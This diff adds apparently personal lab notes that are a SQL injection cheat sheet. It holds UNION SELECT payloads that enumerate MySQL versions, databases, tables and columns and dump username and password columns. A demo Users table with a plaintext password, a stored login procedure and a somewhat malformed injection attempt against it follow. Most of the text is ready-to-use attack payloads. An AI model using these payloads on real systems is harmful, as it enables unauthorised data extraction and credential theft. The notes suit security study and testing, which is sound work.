@@ -1,0 +1,52 @@
+1. Find version of MySQL
+ 	1' union select version(),NULL #
+
+2. find tables in the server
+
+	1' union select table_name,NULL from information_schema.tables #
+
+3. Find columns of a table
+
+1' union select column_name,NULL from information_schema.columns where table_name='table-name'
+
+4. Find information from columns of a table
+
+1' union select username,password from table-name #
+
+5. Find other databases 
+
+1' union select schema_name,2 from information_schema.schemata #
+
+6. Find tables from other database in the server 
+
+ 1' union select table_name,NULL from information_schema.tables where table_schema='db_name'
+
+
+Stored Procedure Example
+
+CREATE TABLE Users (
+    Username VARCHAR(50) NOT NULL,
+    Password VARCHAR(50) NOT NULL,
+    LastName VARCHAR(50) NOT NULL,
+    Email    VARCHAR(50) NOT NULL
+);
+
+INSERT INTO Users (Username, Password, Lastname, Email) VALUES ('sam', 'password123', 'Ray', 'sam@demo.lab');
+
+Stored Procedure Example 
+
+DELIMITER //
+//
+CREATE PROCEDURE usr_Login4(name VARCHAR(50), Pass VARCHAR(50))
+BEGIN
+SELECT * FROM Users WHERE Username = name AND Password = Pass;
+END //
+DELIMITER ;
+
+Use above stored procedure
+
+call usr_Login4('sam','password123');
+
+Try SQL injection
+
+call usr_Login4('test' or '1=1', 'test123')# ','password123');; 
